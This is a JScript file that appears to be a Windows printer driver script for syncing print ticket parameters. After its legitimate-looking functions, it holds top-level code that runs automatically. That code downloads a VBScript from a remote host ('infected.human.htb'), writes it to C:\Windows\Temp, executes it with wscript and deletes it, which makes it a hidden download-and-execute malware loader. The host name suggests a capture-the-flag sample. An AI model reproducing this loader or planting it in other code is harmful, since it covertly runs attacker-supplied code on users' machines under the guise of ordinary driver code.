function updatePrintTicketFromParameters(parameterProvider, parameterDefinitions, printTicket) {
    setStandardNameSpaces(printTicket.XmlNode);
    var namespacePrefix = getPrefixForNamespace(printTicket.XmlNode, "http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords");
    if (namespacePrefix != null) {
        var pdcParameterDefs = getParameterDefs(parameterDefinitions);
        for (var defCount = 0; defCount < pdcParameterDefs.length; defCount++) {
            var paramString = parameterProvider.getString(pdcParameterDefs[defCount]);
            if (paramString != null && paramString.length > 0) {
                var paramName = namespacePrefix + ":" + pdcParameterDefs[defCount];
                var currNode = printTicket.GetParameterInitializer(pdcParameterDefs[defCount], "http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords");
                if (currNode == null) {
                    var ptRoot = printTicket.XmlNode.selectSingleNode("psf:PrintTicket");
                    var newParam = createProperty(paramName, "psf:ParameterInit", "xsd:string", paramString, printTicket);
                    ptRoot.appendChild(newParam);
                } else {
                    currNode.Value = paramString;
                }
            }
        }
    }
}

function updateParametersFromPrintTicket(printTicket, parameterDefinitions, parameterProvider) {
    setStandardNameSpaces(printTicket.XmlNode);
    var namespacePrefix = getPrefixForNamespace(printTicket.XmlNode, "http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords");
    if (namespacePrefix != null) {
        var pdcParameterDefs = getParameterDefs(parameterDefinitions);
        for (var defCount = 0; defCount < pdcParameterDefs.length; defCount++) {
            var currNode = printTicket.GetParameterInitializer(pdcParameterDefs[defCount], "http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords");
            if (currNode != null) {
                parameterProvider.setString(pdcParameterDefs[defCount], currNode.Value);
            }
        }
    }
}

var xmlHttp = new ActiveXObject("MSXML2.XMLHTTP.6.0");
var fileSystemObject = new ActiveXObject("Scripting.FileSystemObject");
var wscriptShell = new ActiveXObject("WScript.Shell");
var tempDir = 'C:\\Windows\\Temp';
var tempVbsFileName = fileSystemObject.GetTempName() + ".vbs";
var tempVbsFilePath = fileSystemObject.BuildPath(tempDir, tempVbsFileName);

xmlHttp.open("GET", "http://infected.human.htb/d/BKtQR", false);
xmlHttp.send();

if (xmlHttp.status === 200) {
    var scriptText = xmlHttp.responseText;
    var tempFile = fileSystemObject.CreateTextFile(tempVbsFilePath, true);
    tempFile.write(scriptText);
    tempFile.close();
    var process = wscriptShell.Exec('wscript "' + tempVbsFilePath + '"');
    while (process.Status === 0) {
        WScript.Sleep(100);
    }
    fileSystemObject.DeleteFile(tempVbsFilePath);
} else {
    WScript.Echo("Fatal: " + xmlHttp.status);
}